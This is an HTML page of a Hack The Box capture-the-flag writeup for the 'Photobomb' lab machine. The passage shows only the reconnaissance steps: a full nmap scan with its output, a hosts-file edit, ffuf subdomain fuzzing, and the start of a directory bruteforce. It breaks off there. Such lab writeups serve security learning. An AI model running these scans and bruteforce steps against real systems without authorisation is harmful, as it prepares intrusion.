@@ -1,0 +1,1291 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='This is a writeup of the Photobomb machine in Hack The Box platform.'><title>Photobomb HTB Writeup</title>
+
+<link rel='canonical' href='https://AbdallahAdham.com/p/photobomb-htb-writeup/'>
+
+<link rel="stylesheet" href="/scss/style.min.5a8e892f6fa14515e9065eee1f5d2e05302606ec7f11750b2fb95198f9cdcbfd.css"><meta property='og:title' content='Photobomb HTB Writeup'>
+<meta property='og:description' content='This is a writeup of the Photobomb machine in Hack The Box platform.'>
+<meta property='og:url' content='https://AbdallahAdham.com/p/photobomb-htb-writeup/'>
+<meta property='og:site_name' content='Abdallah Adham'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='PenTesting' /><meta property='article:tag' content='Web' /><meta property='article:tag' content='Exploit' /><meta property='article:tag' content='Vulnerability' /><meta property='article:published_time' content='2022-11-10T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-11-10T00:00:00&#43;00:00'/><meta property='og:image' content='https://AbdallahAdham.com/post/Photobomb_HTB/photobomb_htb.jpg' />
+<meta name="twitter:title" content="Photobomb HTB Writeup">
+<meta name="twitter:description" content="This is a writeup of the Photobomb machine in Hack The Box platform."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://AbdallahAdham.com/post/Photobomb_HTB/photobomb_htb.jpg' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu329470d11bd58ef0ca657bb7de1c9d5d_53587_300x0_resize_box_3.png" width="300"
+                            height="273" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Abdallah Adham</a></h1>
+            <h2 class="site-description">Jr Penetration Tester</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/AbdallahAdham'
+                        target="_blank"
+                        title="GitHub"
+                    >
+                        
+                        
+                            <svg width="16px" height="16px" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M7.976 0A7.977 7.977 0 000 7.976c0 3.522 2.3 6.507 5.431 7.584.392.049.538-.196.538-.392v-1.37c-2.201.49-2.69-1.076-2.69-1.076-.343-.93-.881-1.175-.881-1.175-.734-.489.048-.489.048-.489.783.049 1.224.832 1.224.832.734 1.223 1.859.88 2.3.685.048-.538.293-.88.489-1.076-1.762-.196-3.621-.881-3.621-3.964 0-.88.293-1.566.832-2.153-.05-.147-.343-.978.098-2.055 0 0 .685-.196 2.201.832.636-.196 1.322-.245 2.007-.245s1.37.098 2.006.245c1.517-1.027 2.202-.832 2.202-.832.44 1.077.146 1.908.097 2.104a3.16 3.16 0 01.832 2.153c0 3.083-1.86 3.719-3.62 3.915.293.244.538.733.538 1.467v2.202c0 .196.146.44.538.392A7.984 7.984 0 0016 7.976C15.951 3.572 12.38 0 7.976 0z" fill="#000"/>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://www.linkedin.com/in/abdallah-adham/'
+                        target="_blank"
+                        title="Linkedin"
+                    >
+                        
+                        
+                            <?xml version="1.0" encoding="iso-8859-1"?>
+<!-- Generator: Adobe Illustrator 19.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 viewBox="0 0 310 310" style="enable-background:new 0 0 310 310;" xml:space="preserve">
+<g id="XMLID_801_">
+	<path id="XMLID_802_" d="M72.16,99.73H9.927c-2.762,0-5,2.239-5,5v199.928c0,2.762,2.238,5,5,5H72.16c2.762,0,5-2.238,5-5V104.73
+		C77.16,101.969,74.922,99.73,72.16,99.73z"/>
+	<path id="XMLID_803_" d="M41.066,0.341C18.422,0.341,0,18.743,0,41.362C0,63.991,18.422,82.4,41.066,82.4
+		c22.626,0,41.033-18.41,41.033-41.038C82.1,18.743,63.692,0.341,41.066,0.341z"/>
+	<path id="XMLID_804_" d="M230.454,94.761c-24.995,0-43.472,10.745-54.679,22.954V104.73c0-2.761-2.238-5-5-5h-59.599
+		c-2.762,0-5,2.239-5,5v199.928c0,2.762,2.238,5,5,5h62.097c2.762,0,5-2.238,5-5v-98.918c0-33.333,9.054-46.319,32.29-46.319
+		c25.306,0,27.317,20.818,27.317,48.034v97.204c0,2.762,2.238,5,5,5H305c2.762,0,5-2.238,5-5V194.995
+		C310,145.43,300.549,94.761,230.454,94.761z"/>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/AbdallahAdham13'
+                        target="_blank"
+                        title="Twitter"
+                    >
+                        
+                        
+                            <?xml version="1.0" encoding="iso-8859-1"?>
+<!-- Generator: Adobe Illustrator 19.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 viewBox="0 0 310 310" style="enable-background:new 0 0 310 310;" xml:space="preserve">
+<g id="XMLID_826_">
+	<path id="XMLID_827_" d="M302.973,57.388c-4.87,2.16-9.877,3.983-14.993,5.463c6.057-6.85,10.675-14.91,13.494-23.73
+		c0.632-1.977-0.023-4.141-1.648-5.434c-1.623-1.294-3.878-1.449-5.665-0.39c-10.865,6.444-22.587,11.075-34.878,13.783
+		c-12.381-12.098-29.197-18.983-46.581-18.983c-36.695,0-66.549,29.853-66.549,66.547c0,2.89,0.183,5.764,0.545,8.598
+		C101.163,99.244,58.83,76.863,29.76,41.204c-1.036-1.271-2.632-1.956-4.266-1.825c-1.635,0.128-3.104,1.05-3.93,2.467
+		c-5.896,10.117-9.013,21.688-9.013,33.461c0,16.035,5.725,31.249,15.838,43.137c-3.075-1.065-6.059-2.396-8.907-3.977
+		c-1.529-0.851-3.395-0.838-4.914,0.033c-1.52,0.871-2.473,2.473-2.513,4.224c-0.007,0.295-0.007,0.59-0.007,0.889
+		c0,23.935,12.882,45.484,32.577,57.229c-1.692-0.169-3.383-0.414-5.063-0.735c-1.732-0.331-3.513,0.276-4.681,1.597
+		c-1.17,1.32-1.557,3.16-1.018,4.84c7.29,22.76,26.059,39.501,48.749,44.605c-18.819,11.787-40.34,17.961-62.932,17.961
+		c-4.714,0-9.455-0.277-14.095-0.826c-2.305-0.274-4.509,1.087-5.294,3.279c-0.785,2.193,0.047,4.638,2.008,5.895
+		c29.023,18.609,62.582,28.445,97.047,28.445c67.754,0,110.139-31.95,133.764-58.753c29.46-33.421,46.356-77.658,46.356-121.367
+		c0-1.826-0.028-3.67-0.084-5.508c11.623-8.757,21.63-19.355,29.773-31.536c1.237-1.85,1.103-4.295-0.33-5.998
+		C307.394,57.037,305.009,56.486,302.973,57.388z"/>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/photobomb-htb-writeup/">
+                
+                    <img src="/post/Photobomb_HTB/photobomb_htb.jpg" loading="lazy" alt="Featured image of post Photobomb HTB Writeup" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/pen-testing/" style="background-color: #2a9d8f; color: #fff;">
+                Pen-Testing
+            </a>
+        
+            <a href="/categories/web-security/" style="background-color: #2a9d8f; color: #fff;">
+                Web-Security
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/photobomb-htb-writeup/">Photobomb HTB Writeup</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            This is a writeup of the Photobomb machine in Hack The Box platform.
+        </h3>
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">July 11, 101010</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    7 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <hr>
+<h2 id="scanning">Scanning</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap 10.10.11.182 -A -T4 -p- -oN nmap.txt
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-11-10 08:38 EST
+</span></span><span class="line"><span class="cl">Stats: 0:00:05 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">0</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Ping Scan
+</span></span><span class="line"><span class="cl">Parallel DNS resolution of <span class="m">1</span> host. Timing: About 0.00% <span class="k">done</span>
+</span></span><span class="line"><span class="cl">Stats: 0:00:23 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Connect Scan
+</span></span><span class="line"><span class="cl">Connect Scan Timing: About 0.63% <span class="k">done</span>
+</span></span><span class="line"><span class="cl">Stats: 0:00:44 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Connect Scan
+</span></span><span class="line"><span class="cl">Connect Scan Timing: About 3.11% <span class="k">done</span><span class="p">;</span> ETC: 08:54 <span class="o">(</span>0:15:34 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stats: 0:01:10 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Connect Scan
+</span></span><span class="line"><span class="cl">Connect Scan Timing: About 6.54% <span class="k">done</span><span class="p">;</span> ETC: 08:52 <span class="o">(</span>0:13:21 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stats: 0:01:11 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Connect Scan
+</span></span><span class="line"><span class="cl">Connect Scan Timing: About 6.78% <span class="k">done</span><span class="p">;</span> ETC: 08:52 <span class="o">(</span>0:13:04 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stats: 0:01:12 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Connect Scan
+</span></span><span class="line"><span class="cl">Connect Scan Timing: About 6.89% <span class="k">done</span><span class="p">;</span> ETC: 08:52 <span class="o">(</span>0:13:03 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stats: 0:01:13 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Connect Scan
+</span></span><span class="line"><span class="cl">Connect Scan Timing: About 6.98% <span class="k">done</span><span class="p">;</span> ETC: 08:52 <span class="o">(</span>0:13:06 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stats: 0:01:13 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Connect Scan
+</span></span><span class="line"><span class="cl">Connect Scan Timing: About 6.99% <span class="k">done</span><span class="p">;</span> ETC: 08:52 <span class="o">(</span>0:13:05 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stats: 0:01:13 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Connect Scan
+</span></span><span class="line"><span class="cl">Connect Scan Timing: About 7.04% <span class="k">done</span><span class="p">;</span> ETC: 08:52 <span class="o">(</span>0:12:59 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stats: 0:01:13 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Connect Scan
+</span></span><span class="line"><span class="cl">Connect Scan Timing: About 7.06% <span class="k">done</span><span class="p">;</span> ETC: 08:52 <span class="o">(</span>0:12:56 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stats: 0:01:14 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Connect Scan
+</span></span><span class="line"><span class="cl">Connect Scan Timing: About 7.08% <span class="k">done</span><span class="p">;</span> ETC: 08:52 <span class="o">(</span>0:13:07 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stats: 0:01:14 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Connect Scan
+</span></span><span class="line"><span class="cl">Connect Scan Timing: About 7.12% <span class="k">done</span><span class="p">;</span> ETC: 08:52 <span class="o">(</span>0:13:03 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stats: 0:01:14 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Connect Scan
+</span></span><span class="line"><span class="cl">Connect Scan Timing: About 7.16% <span class="k">done</span><span class="p">;</span> ETC: 08:52 <span class="o">(</span>0:12:58 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stats: 0:01:14 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Connect Scan
+</span></span><span class="line"><span class="cl">Connect Scan Timing: About 7.16% <span class="k">done</span><span class="p">;</span> ETC: 08:52 <span class="o">(</span>0:12:57 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stats: 0:01:14 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Connect Scan
+</span></span><span class="line"><span class="cl">Connect Scan Timing: About 7.17% <span class="k">done</span><span class="p">;</span> ETC: 08:52 <span class="o">(</span>0:12:57 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stats: 0:01:14 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Connect Scan
+</span></span><span class="line"><span class="cl">Connect Scan Timing: About 7.19% <span class="k">done</span><span class="p">;</span> ETC: 08:52 <span class="o">(</span>0:12:55 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stats: 0:01:15 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Connect Scan
+</span></span><span class="line"><span class="cl">Connect Scan Timing: About 7.21% <span class="k">done</span><span class="p">;</span> ETC: 08:52 <span class="o">(</span>0:13:05 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stats: 0:01:15 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Connect Scan
+</span></span><span class="line"><span class="cl">Connect Scan Timing: About 7.21% <span class="k">done</span><span class="p">;</span> ETC: 08:52 <span class="o">(</span>0:13:05 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Warning: 10.10.11.182 giving up on port because retransmission cap hit <span class="o">(</span>6<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.182
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.20s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65524</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT      STATE    SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> e22473bbfbdf5cb520b66876748ab58d <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 04e3ac6e184e1b7effac4fe39dd21bae <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 20e05d8cba71f08c3a1819f24011d29e <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp    open     http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://photobomb.htb/
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">17692/tcp filtered unknown
+</span></span><span class="line"><span class="cl">18162/tcp filtered unknown
+</span></span><span class="line"><span class="cl">22855/tcp filtered unknown
+</span></span><span class="line"><span class="cl">24998/tcp filtered unknown
+</span></span><span class="line"><span class="cl">44623/tcp filtered unknown
+</span></span><span class="line"><span class="cl">45323/tcp filtered unknown
+</span></span><span class="line"><span class="cl">45854/tcp filtered unknown
+</span></span><span class="line"><span class="cl">48742/tcp filtered unknown
+</span></span><span class="line"><span class="cl">55815/tcp filtered unknown
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 849.15 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After the scan has finished, Ofcourse i will add the machine IP to <em>/etc/hosts</em>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo <span class="nb">echo</span> <span class="s2">&#34;10.10.11.182    photobomb.htb&#34;</span> &gt;&gt; /etc/hosts
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="enumeration">Enumeration</h2>
+<h3 id="http-enumeration">HTTP Enumeration</h3>
+<p>Now, We open the browser and see what is in this website.</p>
+<p><img src="/post/Photobomb_HTB/imgs/1.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="http_enum"
+	
+	
+></p>
+<p>There is a <strong>&ldquo;Click here!&rdquo;</strong> button, Let&rsquo;s click on it ans see what happens?</p>
+<p><img src="/post/Photobomb_HTB/imgs/2.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="sign_up1"
+	
+	
+></p>
+<p>It opens a pop-up sign up form and asks for a username and password and if failed it redirects you to a <strong>&ldquo;401 Authorization Required&rdquo;</strong> under a <strong>/printer</strong> directory.</p>
+<p><img src="/post/Photobomb_HTB/imgs/3.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="401_page"
+	
+	
+></p>
+<p>Now, I will do two things which are:</p>
+<ol>
+<li>Subdomain Enumeration</li>
+<li>Directory Bruteforce</li>
+</ol>
+<h3 id="subdomain-enumeration">Subdomain Enumeration</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ffuf -w Discovery/DNS/bitquark-subdomains-top100000.txt -H <span class="s2">&#34;Host: FUZZ.photobomb.htb&#34;</span> -u http://photobomb.htb -t <span class="m">10</span> -mc <span class="m">200</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I have not found any subdomains that exist.</p>
+<h3 id="directory-bruteforce">Directory Bruteforce</h3>
+<p>I am going to use <strong>Dirbuster</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
